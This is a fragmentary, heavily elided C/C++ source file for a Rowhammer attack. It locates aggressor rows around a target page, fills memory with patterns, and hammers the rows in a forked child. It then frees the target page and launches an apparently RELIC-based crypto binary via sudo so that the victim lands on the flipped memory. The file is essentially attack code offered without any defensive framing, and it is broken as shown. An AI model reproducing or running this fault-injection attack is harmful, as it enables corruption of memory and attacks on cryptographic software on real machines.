...
int STACK_SIZE = 0;
int NUMBER_PAGES=0,TARGET_PAGE=0;
size_t mem_size;
char *memory;
...
void rowhammerAttack(vector<PageCandidate> &pages) {
    ...
    if(pages[i].aboveVA[0]!=NULL && pages[i].belowVA[0]!=NULL && pages[i].pageVA !=NULL)
    {
        ...
        printf("Above VA1: %p\n", pages[TARGET_PAGE].aboveVA[0]);
        printf("Target VA: %p\n", pages[TARGET_PAGE].pageVA);
        printf("Below VA1: %p\n", pages[TARGET_PAGE].belowVA[0]);
   	printf("bit flip:%ld\n", offset[TARGET_PAGE]);
        printf("\n");
...
/*
    ...
    */
            PageCandidate p = pages[TARGET_PAGE];
        if(!pagesFilled(p)) {
            printf("Page not found. Exiting...\n");
            exit(1);
            }
...
*/
    ...
    int count = 0;
    while(indices.size() < 2000+ STACK_SIZE) {
...
FILE* fp4=fopen("page.txt","w");
  ...
  /*  for(int i = 0; i < NUMBER_PAGES; i++) {
    ...
    */
    ...
    for(int i = 2000; i < 2000+STACK_SIZE; ++i) {
    ...
    if(pid == 0) {
        ...
        for(int i = 0; i < 2000; i++) {
            ...
            memset((void *) pages[TARGET_PAGE].pageVA, TARGET_PAGE&0xFF, PAGE_SIZE);
        
        for(int i = 2000; i < STACK_SIZE+2000; i++) {
            int index = indices[i].first;
            memset(mapping + PAGE_SIZE * index, (NUMBER_PAGES + index)&0xFF, PAGE_SIZE);
        }
        hammer=1;
        ...
        while(hammer) {
         ...
         //       for(int pNum = 0; pNum < 2; pNum++) {
                    rowhammer(pages[TARGET_PAGE].aboveVA[0], pages[TARGET_PAGE].belowVA[0], 1000000, togs);
            //    }
        }
	...
	sleep(2);
        ...
        munmap((void *) pages[TARGET_PAGE].pageVA, PAGE_SIZE); 
	...
	int ok = system("sudo taskset -c 2 ./relic-main/main");
...
int main(int argc, char *argv[]) {
    ...
    while(fgets(line,sizeof(line),fp)!=NULL)
    {
    	...
    	offset[NUMBER_PAGES]=attackPages[NUMBER_PAGES]%0x1000;
    	token=strtok(NULL,",");
    	}
